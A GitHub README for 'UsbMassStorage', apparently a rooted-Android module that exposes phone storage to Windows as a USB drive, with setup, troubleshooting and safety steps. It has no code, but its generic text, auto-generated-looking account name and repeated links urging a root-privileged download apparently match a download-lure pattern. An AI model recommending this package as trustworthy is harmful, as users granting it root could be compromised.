# 📱 UsbMassStorage - Turn Your Phone Into USB Drive

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)

## 🚀 What This Does

UsbMassStorage lets you use your Android phone as a USB storage device.  
When you connect it to a Windows PC, your phone can act like a USB drive.

This tool is made for rooted Android devices that use KernelSU, Magisk, or APatch. It works with the USB gadget system on supported phones.

Use it when you want to:

- Share files through USB mass storage
- Make your phone show up as a drive in Windows
- Control USB storage mode from your rooted device
- Use a simple setup instead of file transfer tools

## 📦 Download

Visit this page to download the latest release:

[https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)

Open the release page and download the file that matches your device and root setup.

## 🖥️ What You Need

Before you install UsbMassStorage, check that you have:

- An Android phone with root access
- KernelSU, Magisk, or APatch installed
- USB OTG support or a normal USB data connection
- A Windows PC with a free USB port
- A USB cable that can transfer data, not just charge

Your phone must support the USB gadget config needed for mass storage mode. Most modern rooted devices can use it if the kernel and USB stack allow it.

## 🛠️ How to Set It Up

1. Open the release page above.
2. Download the latest package for UsbMassStorage.
3. Install it on your rooted Android device.
4. Open the app or module after install.
5. Grant root access when your root manager asks.
6. Connect your phone to your Windows PC with a USB cable.
7. Enable USB mass storage mode in the app.
8. Wait for Windows to detect the device as a drive.

If Windows does not show a drive at once, unplug the cable and connect it again.

## 💻 How to Use It on Windows

After setup, Windows should treat your phone like a USB drive.

You can then:

- Open File Explorer
- Find the new removable drive
- Copy files to your phone
- Move files from your phone to the PC
- Safely eject the drive when you are done

If Windows asks how to handle the device, choose the option that opens it in File Explorer.

## 🔧 How It Works

UsbMassStorage uses the USB gadget features built into Android.  
It changes how your phone presents itself over USB.

In mass storage mode, the phone can expose storage to the computer as a disk-like device. That makes it useful for simple file access on Windows.

This project is built for rooted devices because Android usually blocks this type of USB control on stock setups.

## 🧭 Basic Steps After Install

1. Open UsbMassStorage on your phone.
2. Choose the storage you want to share.
3. Turn on mass storage mode.
4. Connect the phone to Windows.
5. Open the new drive on the PC.
6. Copy files as needed.
7. Turn the mode off when finished.

## 📱 Supported Root Setups

UsbMassStorage is designed to work with:

- KernelSU
- Magisk
- APatch

It is focused on rooted Android systems that can manage USB gadget settings.

## 🧰 Common Use Cases

- Moving files without cloud services
- Using a phone like a flash drive
- Sharing media with a Windows desktop
- Testing USB storage behavior on rooted devices
- Giving older PC software a drive it can read

## 🧪 Troubleshooting

### Windows does not detect the phone as a drive

- Unplug the USB cable and connect it again
- Make sure the phone is unlocked
- Check that root access was granted
- Confirm that mass storage mode is turned on
- Try another USB port on the PC

### The app cannot enable storage mode

- Recheck root permission
- Make sure your root tool is active
- Restart the phone and try again
- Use a different USB cable
- Confirm that your device supports USB gadget control

### Windows shows the phone, but no drive appears

- Close and reopen File Explorer
- Disconnect and reconnect the cable
- Disable other USB modes like file transfer if needed
- Try a rear USB port on desktop PCs
- Reboot the phone after install

### Transfer speed is slow

- Use a high quality data cable
- Plug into a USB 3.0 port if possible
- Avoid hubs when testing
- Keep the phone charged during long transfers

## 📁 File Access Tips

- Copy large files in smaller groups if transfers fail
- Keep enough free space on the shared storage
- Eject the drive from Windows before unplugging
- Do not disconnect while files are still moving

## 🔒 Safety and Data Use

Use care when sharing storage over USB.  
If Windows writes to the drive, changes go straight to the selected storage on your phone.

Before you turn on mass storage mode:

- Save your work
- Close files that are open on the phone
- Stop file sync apps if they may change the same files
- Eject the drive on Windows before disconnecting

## 🧾 Release Page

Get the latest version here:

[https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases](https://github.com/nonchristian-oxidationstate863/UsbMassStorage/releases)

## 🏷️ Project Topics

android · apatch · configfs · kernelsu · magisk · mass-storage · root · rust · usb · usb-gadget